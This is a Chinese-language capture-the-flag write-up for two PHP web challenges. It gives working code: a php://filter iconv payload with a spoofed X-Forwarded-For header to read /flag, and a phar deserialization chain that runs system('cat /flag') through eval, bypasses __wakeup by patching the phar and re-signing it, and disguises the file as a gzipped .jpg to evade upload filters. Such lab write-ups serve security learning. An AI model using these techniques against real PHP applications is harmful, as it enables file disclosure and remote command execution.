# 消失的flag
	- 使用 ((66363328-deca-4ae5-a4d2-762a1ecc9636)) 伪协议的`convert`编码格式转换功能读取flag
	- 使用header绕过IP检测
	- ```python
	  
	  r = requests.get(url, params = {
	      "file": "php://filter/convert.iconv.UCS-4.UCS-4/resource=/flag"
	  }, headers = {
	      "X-Forwarded-For": "127.0.0.1"
	  })
	  print(r.text)
	  ```
- # unserialize_web
	- 扫描看到源码`www.tar.gz`
	- 使用phar反序列化读取`/flag`，需要绕过
		- `__wakeup`
		- 关键字检测
		- 文件后缀检测
	- phar反序列化
		- 生成恶意对象放入`phar.phar`
			- ```php
			  <?php
			  //反序列化payload构造
			  class File {
			      public $val1;
			      public $val2;
			      public $val3;
			  
			      public function __construct() {
			          $this->val1 = "val1";
			          $this->val2 = "val2";
			      }
			  
			      public function __destruct() {
			          if ($this->val1 === "file" && $this->val2 === "exists") {
			              if (preg_match('/^\s*system\s*\(\s*\'cat\s+\/[^;]*\'\s*\);\s*$/', $this->val3)) {
			                  eval($this->val3);
			              } else {
			                  echo "Access Denied";
			              }
			          }
			      }
			  
			      public function __access() {
			          $Var = "Access Denied";
			          echo $Var;
			      }
			  
			      public function __wakeup() {
			          $this->val1 = "exists";
			          $this->val2 = "file";
			          echo "文件存在";
			      }
			  }
			  
			  $o = new File();
			  $o->val1='file';
			  $o->val2='exists';
			  $o->val3="system('cat /flag');";
			  //打开phar文件
			  @unlink("phar.phar");
			  $phar = new Phar("phar.phar"); //生成时后缀名必须为phar
			  $phar->startBuffering();
			  $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
			  
			  //放入对象
			  $phar->setMetadata($o);
			  
			  //添加压缩的文件（test为其中的内容）
			  $phar->addFromString("test.txt", "test");
			  $phar->stopBuffering();
			  echo 'use phar.phar';
			  ?>
			  ```
		- 修改`phar.phar`绕过`__wakeup`
			- ```python
			  def sha1_hash(s):
			      sha1_obj = hashlib.sha1()
			      sha1_obj.update(s)
			      return sha1_obj.digest()
			  
			  with open("php_docker/phar.phar", "rb") as f:
			      content = f.read()
			      print(content)
			      content = content.replace(b'"File":3', b'"File":4')
			      content = content[:-28] + sha1_hash(content[:-28]) + content[-8:]
			      print(content)
			      with open("php_docker/modified.phar", "wb") as out:
			          out.write(content)
			  
			  ```
		- 使用`gzip -f modified.phar`压缩绕过关键字检测，得到`modified.phar.gz`，重命名为`mod3.jpg`绕过文件后缀检测并上传
	- 最后触发，拿到flag
		- ```python
		  url = "http://1c300fa3-159a-bef7-2fd1-6e7839227374b834.tq.jxsec.cn:30486/download.php"
		  
		  r = requests.post(url, data = {
		      "file": "phar://upload/mod3.jpg/test.jpg"
		  })
		  r.encoding = r.apparent_encoding
		  print(r.text)
		  ```
-